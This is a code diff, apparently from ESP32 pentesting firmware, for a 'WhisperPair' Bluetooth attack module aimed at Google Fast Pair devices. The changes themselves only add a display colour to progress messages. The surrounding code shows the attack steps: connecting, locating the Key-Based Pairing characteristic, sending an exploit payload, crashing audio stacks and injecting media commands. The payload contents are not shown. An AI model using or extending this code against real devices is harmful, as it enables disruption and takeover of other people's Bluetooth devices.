@@ -245,10 +245,10 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
     
     Serial.printf("[WhisperPair] Starting attack on %s\n", target.toString().c_str());
     
-    showAttackProgress("Preparing BLE...");
+    showAttackProgress("Preparing BLE...", TFT_WHITE);
     bleManager.prepareForConnection();
     
-    showAttackProgress("Connecting...");
+    showAttackProgress("Connecting...", TFT_WHITE);
     NimBLEClient* pClient = nullptr;
     if(!bleManager.connectToDevice(target, &pClient)) {
         showAttackResult(false, "Connection failed");
@@ -256,7 +256,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         return false;
     }
     
-    showAttackProgress("Discovering services...");
+    showAttackProgress("Discovering services...", TFT_WHITE);
     if(!pClient->discoverAttributes()) {
         showAttackResult(false, "Service discovery failed");
         pClient->disconnect();
@@ -264,7 +264,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         return false;
     }
     
-    showAttackProgress("Finding FastPair...");
+    showAttackProgress("Finding FastPair...", TFT_WHITE);
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
         showAttackResult(false, "FastPair service not found");
@@ -273,7 +273,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         return false;
     }
     
-    showAttackProgress("Finding KBP characteristic...");
+    showAttackProgress("Finding KBP characteristic...", TFT_WHITE);
     NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
     if(!pKbpChar) {
         showAttackResult(false, "No writable KBP characteristic");
@@ -287,7 +287,7 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
     
     bool isVulnerable = false;
     
-    showAttackProgress("Sending handshake...");
+    showAttackProgress("Sending handshake...", TFT_WHITE);
     if(performHandshake(pKbpChar)) {
         delay(400);
         
@@ -295,12 +295,12 @@ bool WhisperPairExploit::execute(NimBLEAddress target) {
         if(sendExploitPayload(pKbpChar)) {
             delay(400);
             
-            showAttackProgress("Testing response...");
+            showAttackProgress("Testing response...", TFT_WHITE);
             isVulnerable = testForVulnerability(pKbpChar);
         }
     }
     
-    showAttackProgress("Cleaning up...");
+    showAttackProgress("Cleaning up...", TFT_WHITE);
     if(pClient->isConnected()) {
         pClient->disconnect();
     }
@@ -774,7 +774,7 @@ void audioCommandHijackTest() {
     showAdaptiveMessage("Timeout - service stopped", "OK", "", "", TFT_WHITE, true, false);
 }
 
-void showAttackProgress(const char* message, uint32_t color) {
+void showAttackProgress(const char* message, uint16_t color) {
     tft.fillScreen(bruceConfig.bgColor);
     drawMainBorderWithTitle("WHISPERPAIR");
     tft.setTextColor(color, bruceConfig.bgColor);
@@ -878,7 +878,7 @@ void runAudioStackCrash(NimBLEAddress target) {
         return;
     }
     
-    showAttackProgress("Attacking audio stack...");
+    showAttackProgress("Attacking audio stack...", TFT_WHITE);
     AudioAttackService audioAttack;
     bool result = audioAttack.crashAudioStack(target);
     showAttackResult(result, result ? "Audio stack attack sent!" : "Attack failed");
@@ -889,14 +889,14 @@ void runMediaCommandHijack(NimBLEAddress target) {
         return;
     }
     
-    showAttackProgress("Injecting media commands...");
+    showAttackProgress("Injecting media commands...", TFT_WHITE);
     AudioAttackService audioAttack;
     bool result = audioAttack.injectMediaCommands(target);
     showAttackResult(result, result ? "Media commands sent!" : "No media service found");
 }
 
 void runQuickTest(NimBLEAddress target) {
-    showAttackProgress("Quick testing...");
+    showAttackProgress("Quick testing...", TFT_WHITE);
     WhisperPairExploit exploit;
     bool result = exploit.executeSilent(target);
     showAttackResult(result, result ? "VULNERABLE!" : "Patched/Safe");
